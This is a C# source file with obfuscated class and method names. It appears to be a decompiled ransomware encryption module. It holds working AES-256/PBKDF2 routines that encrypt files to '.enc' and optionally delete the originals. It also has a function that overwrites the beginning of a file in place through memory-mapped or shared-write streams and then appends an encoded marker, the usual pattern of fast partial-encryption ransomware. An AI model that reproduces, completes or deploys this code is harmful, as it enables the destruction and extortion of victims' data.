using System;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Linq;
using System.Security.Cryptography;
using System.Text;

namespace oEqFtKwIikP;

public static class WKTrUcDvdshUI
{
	public const int vNMqUjYzzPm = 256;

	public static byte[] PfDxDrHajuaicOL(int OhqESGIiQFjwAG)
	{
		byte[] array = new byte[OhqESGIiQFjwAG];
		using RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		rNGCryptoServiceProvider.GetBytes(array);
		return array;
	}

	public static bool rQQADRSOgjm(string yJQOTLUsDVC, byte[] TzcnkyWfPNbF, bool rREAceFBzDKcg)
	{
		byte[] array = PfDxDrHajuaicOL(16);
		using FileStream fileStream = new FileStream(yJQOTLUsDVC + ".enc", FileMode.Create);
		Rfc2898DeriveBytes rfc2898DeriveBytes = pfttmnwgwwWNpd(TzcnkyWfPNbF, array);
		TzcnkyWfPNbF = null;
		GC.Collect();
		using Aes aes = new AesManaged();
		aes.KeySize = 256;
		aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8);
		aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8);
		aes.Padding = PaddingMode.ISO10126;
		aes.Mode = CipherMode.CBC;
		fileStream.Write(array, 0, array.Length);
		using CryptoStream cryptoStream = new CryptoStream(fileStream, aes.CreateEncryptor(), CryptoStreamMode.Write);
		using FileStream fileStream2 = new FileStream(yJQOTLUsDVC, FileMode.Open);
		byte[] array2 = new byte[1];
		rfc2898DeriveBytes.Dispose();
		try
		{
			int count;
			while ((count = fileStream2.Read(array2, 0, array2.Length)) > 0)
			{
				cryptoStream.Write(array2, 0, count);
			}
			if (rREAceFBzDKcg)
			{
				File.Delete(yJQOTLUsDVC);
			}
			cryptoStream.Close();
			fileStream.Close();
			fileStream2.Close();
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public static bool VtkZZuWmneJ(string rwkNEOSQGX, byte[] falBsXllZMJnOGQ, bool VUYzGJNJhxkoO)
	{
		byte[] array = new byte[16];
		using FileStream fileStream = new FileStream(rwkNEOSQGX, FileMode.Open);
		fileStream.Read(array, 0, array.Length);
		Rfc2898DeriveBytes rfc2898DeriveBytes = pfttmnwgwwWNpd(falBsXllZMJnOGQ, array);
		falBsXllZMJnOGQ = null;
		GC.Collect();
		using Aes aes = new AesManaged();
		aes.KeySize = 256;
		aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8);
		aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8);
		aes.Padding = PaddingMode.ISO10126;
		aes.Mode = CipherMode.CBC;
		using CryptoStream cryptoStream = new CryptoStream(fileStream, aes.CreateDecryptor(), CryptoStreamMode.Read);
		using FileStream fileStream2 = new FileStream(rwkNEOSQGX.Remove(rwkNEOSQGX.Length - 4), FileMode.Create);
		byte[] array2 = new byte[1];
		rfc2898DeriveBytes.Dispose();
		try
		{
			while (cryptoStream.Read(array2, 0, array2.Length) > 0)
			{
				fileStream2.Write(array2, 0, array2.Length);
			}
			cryptoStream.FlushFinalBlock();
			fileStream2.Close();
			fileStream.Close();
			cryptoStream.Close();
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public static byte[] nJFhMsmRXfyvJ(byte[] AGiQcelJUxcA, byte[] xsioYVWbYdBK, byte[] HvVkHWfUvtY)
	{
		byte[] result = null;
		Rfc2898DeriveBytes rfc2898DeriveBytes = pfttmnwgwwWNpd(xsioYVWbYdBK, HvVkHWfUvtY);
		xsioYVWbYdBK = null;
		GC.Collect();
		using Aes aes = new AesManaged();
		aes.KeySize = 256;
		aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8);
		aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8);
		aes.Padding = PaddingMode.None;
		aes.Mode = CipherMode.CBC;
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateEncryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(AGiQcelJUxcA, 0, AGiQcelJUxcA.Length);
				cryptoStream.Close();
			}
			result = memoryStream.ToArray();
		}
		rfc2898DeriveBytes.Dispose();
		return result;
	}

	public static byte[] BJbbBUNxISkAZBpz(byte[] ljjrfkBorhzw, byte[] FmhRUdEAljPMb, byte[] rkbUeczvwNus)
	{
		byte[] result = null;
		Rfc2898DeriveBytes rfc2898DeriveBytes = pfttmnwgwwWNpd(FmhRUdEAljPMb, rkbUeczvwNus);
		FmhRUdEAljPMb = null;
		GC.Collect();
		using Aes aes = new AesManaged();
		aes.KeySize = 256;
		aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8);
		aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8);
		aes.Padding = PaddingMode.None;
		aes.Mode = CipherMode.CBC;
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateDecryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(ljjrfkBorhzw, 0, ljjrfkBorhzw.Length);
				cryptoStream.Close();
			}
			result = memoryStream.ToArray();
		}
		rfc2898DeriveBytes.Dispose();
		return result;
	}

	public static bool SHLmCPVMFruY(byte[] BnojtdDXFfe, byte[] MzondfKTqBet, byte[] pzkESwEfNhh)
	{
		using Rfc2898DeriveBytes rfc2898DeriveBytes = pfttmnwgwwWNpd(BnojtdDXFfe, MzondfKTqBet);
		byte[] bytes = rfc2898DeriveBytes.GetBytes(32);
		return bytes.SequenceEqual(pzkESwEfNhh);
	}

	public static Rfc2898DeriveBytes pfttmnwgwwWNpd(byte[] HouHyUdvpQuG, byte[] zSaqWJLCHfmwc)
	{
		return new Rfc2898DeriveBytes(HouHyUdvpQuG, zSaqWJLCHfmwc, 52768);
	}

	public static byte[] SYFaRhrUKFjplK(string YzCYpxpvwHT, int IosprIZAjGEP)
	{
		byte[] array = new byte[IosprIZAjGEP];
		try
		{
			if (ieyWohRMXsyos.QgGVhvIEkwK == "YES")
			{
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(YzCYpxpvwHT, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Read(array, 0, IosprIZAjGEP);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				return array;
			}
			FileStream fileStream = new FileStream(YzCYpxpvwHT, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream.Read(array, 0, IosprIZAjGEP);
			fileStream.Close();
			fileStream.Dispose();
			return array;
		}
		catch (Exception)
		{
			FileStream fileStream2 = new FileStream(YzCYpxpvwHT, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream2.Read(array, 0, IosprIZAjGEP);
			fileStream2.Close();
			fileStream2.Dispose();
			return array;
		}
	}

	public static void FjemdWpOHZlReLE(string MJvCsRpxIIwTa, byte[] gPLnSCijzCol)
	{
		try
		{
			if (ieyWohRMXsyos.QgGVhvIEkwK == "YES")
			{
				byte[] bytes = Encoding.ASCII.GetBytes(ieyWohRMXsyos.tEHBqPAYINDcv(ieyWohRMXsyos.HNNOfjJYKKEGv) + ieyWohRMXsyos.tEHBqPAYINDcv("LQ==") + Convert.ToString(ieyWohRMXsyos.xUhpmBbRMOnPvOyQY) + ieyWohRMXsyos.tEHBqPAYINDcv("LQ=="));
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(MJvCsRpxIIwTa, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Write(gPLnSCijzCol, 0, gPLnSCijzCol.Length);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				using FileStream fileStream = new FileStream(MJvCsRpxIIwTa, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				fileStream.Write(bytes, 0, bytes.Length);
				return;
			}
			byte[] bytes2 = Encoding.ASCII.GetBytes(ieyWohRMXsyos.tEHBqPAYINDcv(ieyWohRMXsyos.HNNOfjJYKKEGv) + ieyWohRMXsyos.tEHBqPAYINDcv("LQ==") + Convert.ToString(ieyWohRMXsyos.xUhpmBbRMOnPvOyQY) + ieyWohRMXsyos.tEHBqPAYINDcv("LQ=="));
			FileStream fileStream2 = new FileStream(MJvCsRpxIIwTa, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
			fileStream2.Write(gPLnSCijzCol, 0, gPLnSCijzCol.Length);
			fileStream2.Close();
			fileStream2.Dispose();
			using FileStream fileStream3 = new FileStream(MJvCsRpxIIwTa, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
			fileStream3.Write(bytes2, 0, bytes2.Length);
		}
		catch (Exception)
		{
			byte[] bytes3 = Encoding.ASCII.GetBytes(ieyWohRMXsyos.tEHBqPAYINDcv(ieyWohRMXsyos.HNNOfjJYKKEGv) + ieyWohRMXsyos.tEHBqPAYINDcv("LQ==") + Convert.ToString(ieyWohRMXsyos.xUhpmBbRMOnPvOyQY) + ieyWohRMXsyos.tEHBqPAYINDcv("LQ=="));
			FileStream fileStream4 = new FileStream(MJvCsRpxIIwTa, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
			fileStream4.Write(gPLnSCijzCol, 0, gPLnSCijzCol.Length);
			fileStream4.Close();
			fileStream4.Dispose();
			using FileStream fileStream5 = new FileStream(MJvCsRpxIIwTa, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
			fileStream5.Write(bytes3, 0, bytes3.Length);
		}
	}
}
